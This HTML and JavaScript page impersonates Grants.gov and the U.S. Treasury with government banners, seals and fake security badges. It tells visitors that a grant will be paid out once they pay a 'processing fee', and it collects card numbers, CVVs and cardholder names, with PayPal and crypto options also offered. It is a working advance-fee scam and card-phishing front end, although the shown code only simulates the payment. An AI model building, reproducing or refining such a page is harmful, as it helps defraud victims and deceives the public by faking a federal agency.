<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment | Grants.gov Official</title>
    
    <!-- Official USWDS Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700;900&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        /* ===== OFFICIAL U.S. GOVERNMENT STYLING ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f0f0;
            color: #1b1b1b;
            line-height: 1.5;
        }

        /* === USA Flag Banner === */
        .usa-banner {
            background-color: #f0f0f0;
            font-size: 14px;
            padding: 8px 0;
            border-bottom: 1px solid #d9d9d9;
        }

        .banner-content {
            max-width: 1280px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .usa-flag {
            width: 20px;
            height: 20px;
            background: linear-gradient(180deg, #b22234 0%, #b22234 50%, #ffffff 50%, #ffffff 100%);
            border: 1px solid #0a0a0a;
        }

        .banner-text strong {
            font-weight: 700;
        }

        .dot-gov {
            margin-left: auto;
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .dot-gov span {
            background: #1b1b1b;
            color: white;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 700;
        }

        /* === Header === */
        .usa-header {
            background: #112f4e;
            color: white;
            border-bottom: 4px solid #b22234;
        }

        .header-content {
            max-width: 1280px;
            margin: 0 auto;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .official-seal {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #112f4e;
            font-size: 24px;
            border: 2px solid #b22234;
        }

        .agency-name h1 {
            font-family: 'Merriweather', serif;
            font-size: 22px;
            font-weight: 700;
            color: white;
        }

        .agency-name .gov-domain {
            font-size: 12px;
            color: #ffd700;
            display: block;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
            color: white;
        }

        .user-info i {
            color: #ffd700;
        }

        .logout-btn {
            background: transparent;
            border: 1px solid white;
            color: white;
            padding: 5px 15px;
            cursor: pointer;
            font-size: 14px;
        }

        .logout-btn:hover {
            background: rgba(255,255,255,0.1);
        }

        /* === Progress Bar === */
        .progress-section {
            background: white;
            border-bottom: 1px solid #d9d9d9;
        }

        .progress-container {
            max-width: 1280px;
            margin: 0 auto;
            padding: 25px 20px;
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            position: relative;
            margin-bottom: 30px;
        }

        .progress-steps::before {
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: #e5e5e5;
            z-index: 1;
        }

        .step {
            position: relative;
            z-index: 2;
            text-align: center;
            flex: 1;
        }

        .step-circle {
            width: 40px;
            height: 40px;
            background: white;
            border: 2px solid #e5e5e5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: 700;
            color: #5c5c5c;
        }

        .step.completed .step-circle {
            background: #b22234;
            border-color: #b22234;
            color: white;
        }

        .step.active .step-circle {
            background: #112f4e;
            border-color: #112f4e;
            color: white;
        }

        .step-label {
            font-size: 14px;
            font-weight: 600;
        }

        /* === Main Container === */
        .main-container {
            max-width: 1100px;
            margin: 40px auto;
            padding: 0 20px;
        }

        /* === Payment Card === */
        .payment-card {
            background: white;
            border: 1px solid #d9d9d9;
            display: grid;
            grid-template-columns: 1.5fr 1fr;
            gap: 0;
        }

        /* === Payment Form === */
        .payment-form {
            padding: 40px;
            border-right: 1px solid #e5e5e5;
        }

        .section-title {
            font-family: 'Merriweather', serif;
            font-size: 20px;
            color: #112f4e;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #b22234;
        }

        .applicant-summary {
            background: #f8f8f8;
            padding: 20px;
            margin-bottom: 30px;
            border-left: 4px solid #112f4e;
        }

        .applicant-summary p {
            margin: 5px 0;
            font-size: 15px;
        }

        .applicant-summary strong {
            color: #112f4e;
        }

        /* === Payment Methods === */
        .payment-methods {
            margin: 30px 0;
        }

        .payment-method {
            border: 2px solid #e5e5e5;
            margin-bottom: 15px;
            transition: all 0.2s;
        }

        .payment-method.selected {
            border-color: #112f4e;
        }

        .method-header {
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }

        .method-header i {
            font-size: 24px;
            color: #112f4e;
        }

        .method-details {
            display: none;
            padding: 0 20px 20px 20px;
            border-top: 1px solid #e5e5e5;
            background: #fafafa;
        }

        .payment-method.selected .method-details {
            display: block;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 14px;
            color: #1b1b1b;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #d9d9d9;
            font-size: 16px;
            transition: all 0.2s;
        }

        .form-group input:focus {
            border-color: #112f4e;
            outline: none;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        /* === Order Summary === */
        .order-summary {
            padding: 40px;
            background: #fafafa;
        }

        .grant-info {
            background: #112f4e;
            color: white;
            padding: 20px;
            margin-bottom: 30px;
        }

        .grant-info h3 {
            font-size: 18px;
            margin-bottom: 5px;
        }

        .grant-info .cfda {
            font-size: 13px;
            opacity: 0.8;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #e5e5e5;
        }

        .summary-total {
            display: flex;
            justify-content: space-between;
            padding: 20px 0;
            font-size: 20px;
            font-weight: 700;
            color: #b22234;
        }

        .fee-notice {
            background: #fff5f5;
            padding: 20px;
            margin: 30px 0;
            border-left: 4px solid #b22234;
            font-size: 14px;
        }

        /* === Buttons === */
        .btn-primary {
            width: 100%;
            padding: 16px;
            background: #b22234;
            color: white;
            border: none;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-primary:hover {
            background: #8b1a1a;
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-secondary {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #112f4e;
            border: 2px solid #112f4e;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            margin-top: 15px;
        }

        .btn-secondary:hover {
            background: #112f4e;
            color: white;
        }

        /* === Messages === */
        .message {
            padding: 15px;
            margin-bottom: 25px;
            display: none;
            align-items: center;
            gap: 10px;
            font-size: 14px;
        }

        .message.error {
            background: #fef2f2;
            border-left: 4px solid #b22234;
            color: #b22234;
        }

        .message.success {
            background: #f0fdf4;
            border-left: 4px solid #10b981;
            color: #10b981;
        }

        /* === Security Badges === */
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
            padding: 20px;
            background: #f8f8f8;
        }

        .security-badges span {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #5c5c5c;
        }

        .security-badges i {
            color: #112f4e;
        }

        /* === No Application Message === */
        .no-application-card {
            background: white;
            border: 1px solid #d9d9d9;
            padding: 60px 40px;
            text-align: center;
        }

        .no-application-card i {
            font-size: 60px;
            color: #b22234;
            margin-bottom: 20px;
        }

        .no-application-card h2 {
            font-family: 'Merriweather', serif;
            font-size: 24px;
            color: #112f4e;
            margin-bottom: 15px;
        }

        /* === Footer === */
        .usa-footer {
            background: #112f4e;
            color: white;
            margin-top: 60px;
            border-top: 4px solid #b22234;
        }

        .footer-content {
            max-width: 1280px;
            margin: 0 auto;
            padding: 30px 20px;
            text-align: center;
            font-size: 14px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: rgba(255,255,255,0.8);
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #ffd700;
        }

        /* === Responsive === */
        @media (max-width: 900px) {
            .payment-card {
                grid-template-columns: 1fr;
            }
            .payment-form {
                border-right: none;
            }
        }
    </style>
</head>
<body>
    <!-- USA BANNER -->
    <div class="usa-banner">
        <div class="banner-content">
            <div class="usa-flag"></div>
            <div class="banner-text">
                <strong>An official website of the United States government</strong>
            </div>
            <div class="dot-gov">
                <i class="fas fa-lock"></i> .gov
                <span>Official</span>
            </div>
        </div>
    </div>

    <!-- HEADER -->
    <header class="usa-header">
        <div class="header-content">
            <div class="logo-area">
                <div class="official-seal">
                    <i class="fas fa-eagle"></i>
                </div>
                <div class="agency-name">
                    <h1>Grants.gov</h1>
                    <span class="gov-domain">U.S. Department of Treasury</span>
                </div>
            </div>
            <div class="user-info" id="userInfo">
                <i class="fas fa-user-circle"></i>
                <span id="userName">Loading...</span>
                <button class="logout-btn" onclick="logout()">Sign Out</button>
            </div>
        </div>
    </header>

    <!-- PROGRESS BAR -->
    <div class="progress-section">
        <div class="progress-container">
            <div class="progress-steps">
                <div class="step completed">
                    <div class="step-circle">✓</div>
                    <div class="step-label">Application</div>
                </div>
                <div class="step active">
                    <div class="step-circle">2</div>
                    <div class="step-label">Payment</div>
                </div>
                <div class="step">
                    <div class="step-circle">3</div>
                    <div class="step-label">Account</div>
                </div>
                <div class="step">
                    <div class="step-circle">4</div>
                    <div class="step-label">Confirmation</div>
                </div>
            </div>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <main class="main-container" id="mainContent">
        <!-- This will be populated by JavaScript -->
    </main>

    <!-- FOOTER -->
    <footer class="usa-footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Privacy Policy</a>
                <a href="#">Accessibility</a>
                <a href="#">FOIA</a>
                <a href="#">Contact Us</a>
            </div>
            <div>
                <i class="fas fa-flag-usa" style="color: #b22234; margin-right: 8px;"></i>
                U.S. Department of Treasury · An official website of the United States government
            </div>
        </div>
    </footer>

    <script>
        // ===== CHECK LOGIN AND APPLICATION STATUS =====
        document.addEventListener('DOMContentLoaded', function() {
            const isLoggedIn = localStorage.getItem('grantsLoggedIn') === 'true';
            const userName = localStorage.getItem('grantsName');
            
            if (!isLoggedIn) {
                window.location.href = 'auth.html';
                return;
            }
            
            document.getElementById('userName').textContent = userName || 'Applicant';
            
            // Check if application data exists
            const appData = JSON.parse(localStorage.getItem('applicationData') || '{}');
            
            if (!appData.firstName) {
                showNoApplication();
            } else {
                showPaymentForm(appData);
            }
        });

        // ===== LOGOUT FUNCTION =====
        function logout() {
            localStorage.removeItem('grantsLoggedIn');
            localStorage.removeItem('grantsName');
            localStorage.removeItem('grantsEmail');
            window.location.href = 'auth.html';
        }

        // ===== SHOW NO APPLICATION =====
        function showNoApplication() {
            const mainContent = document.getElementById('mainContent');
            mainContent.innerHTML = `
                <div class="no-application-card">
                    <i class="fas fa-exclamation-circle"></i>
                    <h2>No Application Found</h2>
                    <p style="color: #5c5c5c; margin-bottom: 30px;">Please complete the application form first before proceeding to payment.</p>
                    <button class="btn-primary" onclick="window.location.href='apply.html'" style="width: auto; padding: 12px 40px;">
                        Go to Application <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
                    </button>
                </div>
            `;
        }

        // ===== SHOW PAYMENT FORM =====
        function showPaymentForm(appData) {
            const grantAmount = parseInt(appData.grantAmount || '0').toLocaleString();
            const processingFee = parseInt(appData.processingFee || '0').toLocaleString();
            
            const mainContent = document.getElementById('mainContent');
            mainContent.innerHTML = `
                <div class="payment-card">
                    <!-- PAYMENT FORM -->
                    <div class="payment-form">
                        <h2 class="section-title">Payment Details</h2>
                        
                        <div class="applicant-summary">
                            <p><strong>Applicant:</strong> ${appData.fullName || appData.firstName + ' ' + appData.lastName}</p>
                            <p><strong>Email:</strong> ${appData.email}</p>
                            <p><strong>Grant:</strong> ${appData.grantName}</p>
                        </div>
                        
                        <div id="errorMessage" class="message error">
                            <i class="fas fa-exclamation-circle"></i>
                            <span id="errorText"></span>
                        </div>
                        
                        <div class="payment-methods">
                            <!-- Credit Card -->
                            <div class="payment-method selected" id="methodCard">
                                <div class="method-header" onclick="selectMethod('card')">
                                    <i class="fas fa-credit-card"></i>
                                    <div>
                                        <h4>Credit / Debit Card</h4>
                                        <p style="color: #5c5c5c;">Visa, Mastercard, American Express, Discover</p>
                                    </div>
                                </div>
                                <div class="method-details">
                                    <div class="form-group">
                                        <label>Card Number</label>
                                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                                    </div>
                                    <div class="form-row">
                                        <div class="form-group">
                                            <label>Expiry Date</label>
                                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
                                        </div>
                                        <div class="form-group">
                                            <label>CVV</label>
                                            <input type="text" id="cvv" placeholder="123" maxlength="3">
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <label>Cardholder Name</label>
                                        <input type="text" id="cardName" placeholder="As shown on card">
                                    </div>
                                </div>
                            </div>
                            
                            <!-- PayPal -->
                            <div class="payment-method" id="methodPaypal">
                                <div class="method-header" onclick="selectMethod('paypal')">
                                    <i class="fab fa-paypal"></i>
                                    <div>
                                        <h4>PayPal</h4>
                                        <p style="color: #5c5c5c;">Pay with your PayPal account</p>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Crypto account -->
                            <div class="payment-method" id="methodBank">
                                <div class="method-header" onclick="selectMethod('bank')">
                                    <i class="fas fa-university">crypto account</i>
                                    <div>
                                        <h4></h4>
                                        <p style="color: #5c5c5c;">Direct crypto account</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <button class="btn-primary" onclick="processPayment()" id="payBtn">
                            Pay Processing Fee: $${processingFee}
                        </button>
                        
                        <button class="btn-secondary" onclick="window.location.href='apply.html'">
                            ← Back to Application
                        </button>
                    </div>
                    
                    <!-- ORDER SUMMARY -->
                    <div class="order-summary">
                        <div class="grant-info">
                            <h3>${appData.grantName}</h3>
                            <div class="cfda">CFDA #${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 1000)}</div>
                        </div>
                        
                        <div class="summary-item">
                            <span>Grant Amount:</span>
                            <span><strong>$${grantAmount}</strong></span>
                        </div>
                        <div class="summary-item">
                            <span>Processing Fee:</span>
                            <span><strong style="color: #b22234;">$${processingFee}</strong></span>
                        </div>
                        <div class="summary-item">
                            <span>Application ID:</span>
                            <span><strong>${appData.applicationId || 'GR-' + Math.floor(Math.random() * 1000000)}</strong></span>
                        </div>
                        
                        <div class="summary-total">
                            <span>Total Due Today:</span>
                            <span>$${processingFee}</span>
                        </div>
                        
                        <div class="fee-notice">
                            <i class="fas fa-info-circle"></i>
                            <p>This processing fee covers application review, verification, and administrative costs. Your grant funds of <strong>$${grantAmount}</strong> will be deposited after successful payment.</p>
                        </div>
                        
                        <div class="security-badges">
                            <span><i class="fas fa-lock"></i> 256-bit SSL</span>
                            <span><i class="fas fa-shield-alt"></i> PCI Compliant</span>
                            <span><i class="fas fa-check-circle"></i> Verified</span>
                        </div>
                    </div>
                </div>
            `;

            // Set up card input formatting
            setupCardInputs();
        }

        // ===== SETUP CARD INPUT FORMATTING =====
        function setupCardInputs() {
            const cardNumber = document.getElementById('cardNumber');
            const expiry = document.getElementById('expiry');
            const cvv = document.getElementById('cvv');
            
            if (cardNumber) {
                cardNumber.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 16) value = value.slice(0, 16);
                    value = value.replace(/(\d{4})/g, '$1 ').trim();
                    e.target.value = value;
                });
            }
            
            if (expiry) {
                expiry.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 4) value = value.slice(0, 4);
                    if (value.length >= 2) {
                        value = value.slice(0, 2) + '/' + value.slice(2);
                    }
                    e.target.value = value;
                });
            }
            
            if (cvv) {
                cvv.addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
                });
            }
        }

        // ===== SELECT PAYMENT METHOD =====
        window.selectMethod = function(method) {
            document.querySelectorAll('.payment-method').forEach(el => {
                el.classList.remove('selected');
            });
            
            if (method === 'card') {
                document.getElementById('methodCard').classList.add('selected');
            } else if (method === 'paypal') {
                document.getElementById('methodPaypal').classList.add('selected');
            } else if (method === 'bank') {
                document.getElementById('methodBank').classList.add('selected');
            }
        };

        // ===== SHOW MESSAGE =====
        function showMessage(message, type) {
            const errorMsg = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');
            
            if (errorMsg && errorText) {
                errorText.textContent = message;
                errorMsg.style.display = 'flex';
                errorMsg.className = `message ${type}`;
                
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 4000);
            }
        }

        // ===== PROCESS PAYMENT =====
        window.processPayment = function() {
            const selectedMethod = document.querySelector('.payment-method.selected');
            
            if (!selectedMethod) {
                showMessage('Please select a payment method', 'error');
                return;
            }
            
            // Validate card details if credit card is selected
            if (selectedMethod.id === 'methodCard') {
                const cardNumber = document.getElementById('cardNumber').value;
                const expiry = document.getElementById('expiry').value;
                const cvv = document.getElementById('cvv').value;
                const cardName = document.getElementById('cardName').value;
                
                if (!cardNumber || !expiry || !cvv || !cardName) {
                    showMessage('Please fill in all card details', 'error');
                    return;
                }
                
                if (cardNumber.replace(/\s/g, '').length < 16) {
                    showMessage('Please enter a valid card number', 'error');
                    return;
                }
                
                if (!expiry.includes('/') || expiry.length < 5) {
                    showMessage('Please enter a valid expiry date (MM/YY)', 'error');
                    return;
                }
                
                if (cvv.length < 3) {
                    showMessage('Please enter a valid CVV', 'error');
                    return;
                }
            }
            
            // Show loading
            const btn = document.getElementById('payBtn');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Payment...';
            btn.disabled = true;
            
            // Simulate payment processing
            setTimeout(() => {
                // Save payment data
                localStorage.setItem('paymentComplete', 'true');
                localStorage.setItem('paymentMethod', selectedMethod.id.replace('method', '').toLowerCase());
                localStorage.setItem('paymentDate', new Date().toISOString());
                
                // Update application step
                localStorage.setItem('applicationStep', '3');
                
                // Redirect to account setup
                window.location.href = 'account.html';
            }, 2000);
        };
    </script>
</body>
</html>
